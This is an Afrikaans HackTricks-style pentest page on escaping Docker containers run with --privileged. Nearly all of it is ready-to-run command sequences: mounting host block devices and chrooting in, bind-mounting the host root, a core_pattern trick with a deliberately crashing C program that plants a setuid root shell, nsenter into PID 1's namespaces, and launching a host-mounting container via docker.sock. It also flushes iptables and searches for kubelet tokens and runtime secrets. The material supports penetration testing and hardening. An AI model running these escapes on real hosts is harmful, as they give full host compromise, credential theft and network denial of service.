# Ontsnap Uit `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'n Kontener wat met `--privileged` gestart is, is nie dieselfde as 'n normale kontener met een of twee ekstra permissies nie. In praktyk verwyder of verswak `--privileged` verskeie van die standaard runtime-beskermings wat gewoonlik die werklading van gevaarlike gasheerhulpbronne weghou. Die presiese uitwerking hang steeds van die runtime en gasheer af, maar vir Docker is die algemene resultaat:

- alle capabilities word toegedeel
- die device cgroup-beperkings word opgehef
- baie kernel filesystems word nie meer as slegs-leesbaar gemonteer nie
- standaard gemaskerde procfs-paaie verdwyn
- seccomp-filtering is gedeaktiveer
- AppArmor-beperking is gedeaktiveer
- SELinux-isolasie is gedeaktiveer of vervang met 'n baie breër etiket

Die belangrike gevolg is dat 'n kontener met `--privileged` gewoonlik nie 'n subtiele kernel-exploit nodig het nie. In baie gevalle kan dit eenvoudig met gasheer-toestelle, gasheer-gesigter kernel filesystems, of runtime-koppelvlakke direk interaksie hê en dan na 'n gasheer-shell pivot.

## Wat `--privileged` Nie Outomaties Verander Nie

`--privileged` sluit nie outomaties aan by die host se PID-, netwerk-, IPC- of UTS-namespaces nie. 'n Kontener met `--privileged` kan steeds private namespaces hê. Dit beteken sommige escape-kettinge vereis 'n ekstra voorwaarde soos:

- 'n host bind mount
- host PID sharing
- host networking
- sigbare host-toestelle
- skryfbare proc/sys-koppelvlakke

Daardie toestande is dikwels maklik om te bevredig in werklike miskonfigurasies, maar hulle is konseptueel apart van `--privileged` self.

## Ontsnappingspaaie

### 1. Monteer Die Gasheerskyf Deur Blootgestelde Toestelle

'n Kontener met `--privileged` sien gewoonlik veel meer device nodes onder `/dev`. As die host se block device sigbaar is, is die eenvoudigste ontsnapping om dit te mount en met `chroot` in die host-filesisteem te gaan:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
As die root partition nie duidelik is nie, enumereer eers die blokindeling:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
As die praktiese roete is om 'n setuid helper in 'n skryfbare host mount te plant in plaas van om `chroot` te gebruik, onthou dat nie elke filesystem die setuid-bit respekteer nie. 'n Vinnige host-side capability check is:
```bash
mount | grep -v "nosuid"
```
Dit is nuttig omdat skryfbare paaie onder die `nosuid` lêerstelsels baie minder interessant is vir klassieke "drop a setuid shell and execute it later" workflows.

Die verzwakte beskermings wat hier uitgebuit word, is:

- full device exposure
- broad capabilities, especially `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount of hergebruik van 'n host bind mount en `chroot`

Indien die host-root-lêerstelsel reeds binne die container gemount is, of as die container die nodige mounts kan skep omdat dit privileged is, is 'n host-shell dikwels net een `chroot` ver:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As daar geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Hierdie pad misbruik:

- verswakte mount-restriksies
- volle capabilities
- gebrek aan MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Misbruik skryfbare `/proc/sys` of `/sys`

Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskerming baie swakker raak. Dit kan host-gerigte kernel-koppelvlakke blootstel wat gewoonlik gemasker of as read-only gemonteer is.

'n Klassieke voorbeeld is `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ander hoëwaarde-paaie sluit in:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Hierdie pad maak misbruik van:

- ontbrekende masked paths
- ontbrekende read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Gebruik volle capabilities vir Mount- Or Namespace-Based Escape

'n geprivilegieerde container kry die capabilities wat gewoonlik uit standaard containers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, en baie ander. Dit is dikwels genoeg om 'n plaaslike voetvesting te omskep in 'n host escape sodra 'n ander blootgestelde oppervlak bestaan.

'n eenvoudige voorbeeld is om addisionele filesystems te mount en namespace entry te gebruik:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
As die host PID ook gedeel word, word die stap selfs korter:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Hierdie pad misbruik:

- the default privileged capability set
- optional host PID sharing

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Ontsnap deur Runtime-sokke

'n privileged container eindig dikwels met host runtime state of sockets sigbaar. As 'n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om 'n tweede container met host-toegang te begin:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Vir containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Hierdie pad maak misbruik van:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Verwyder newe-effekte van netwerkisolering

`--privileged` voeg nie op sigself by die host network namespace nie, maar as die container ook `--network=host` of ander host-network toegang het, word die volledige network stack veranderbaar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit is nie altyd 'n direkte host shell nie, maar dit kan denial of service, traffic interception, of toegang tot loopback-only management services tot gevolg hê.

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lees Host Secrets en Runtime State

Selfs wanneer 'n skoon shell escape nie onmiddellik moontlik is nie, het privileged containers dikwels genoeg toegang om host secrets, kubelet state, runtime metadata, en aangrensende container filesystems te lees:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
As `/var` op die gasheer gemonteer is of die runtime-lêergidse sigbaar is, kan dit genoeg wees vir lateral movement of cloud/Kubernetes credential theft selfs voordat 'n host shell verkry is.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroles

Die doel van die volgende opdragte is om te bevestig watter privileged-container escape families onmiddellik bruikbaar is.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Wat hier interessant is:

- 'n volledige capability-stel, veral `CAP_SYS_ADMIN`
- skryfbare proc/sys-blootstelling
- sigbare host-toestelle
- ontbrekende seccomp- en MAC-beperking
- runtime sockets of host root bind mounts

Enigeen van hierdie mag genoeg wees vir post-exploitation. Verskeie saam beteken gewoonlik dat die container funksioneel een of twee opdragte van host compromise af is.

## Verwante bladsye

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
